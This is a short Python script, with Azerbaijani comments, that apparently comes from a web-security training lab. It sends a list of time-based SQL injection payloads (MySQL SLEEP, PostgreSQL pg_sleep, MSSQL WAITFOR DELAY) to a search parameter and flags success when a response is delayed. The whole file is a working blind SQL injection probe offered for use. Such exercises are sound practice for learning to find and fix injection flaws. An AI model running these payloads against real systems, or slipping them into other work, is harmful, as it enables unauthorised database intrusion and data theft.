import requests
import time

url = "http://web0x01.hbtn/a3/sql_injection/api/all_orders"

# Fərqli sleep variantlarını yoxlayaq
payloads = [
    "test' OR SLEEP(6)--",
    "test' AND SLEEP(6)--",
    "test' OR pg_sleep(6)--",
    "test'; WAITFOR DELAY '0:0:6'--"
]

for p in payloads:
    print(f"Yoxlanılır: {p}")
    start = time.time()
    try:
        res = requests.get(url, params={"search": p}, timeout=10)
        dur = time.time() - start
        print(f"Müddət: {dur:.2f} saniyə")
        if dur >= 5:
            print("[+] UĞURLU! Gecikmə işlədi.")
            break
    except requests.exceptions.Timeout:
        print("[+] TIMEOUT! Gecikmə 10 saniyədən çox çəkdi.")
        break
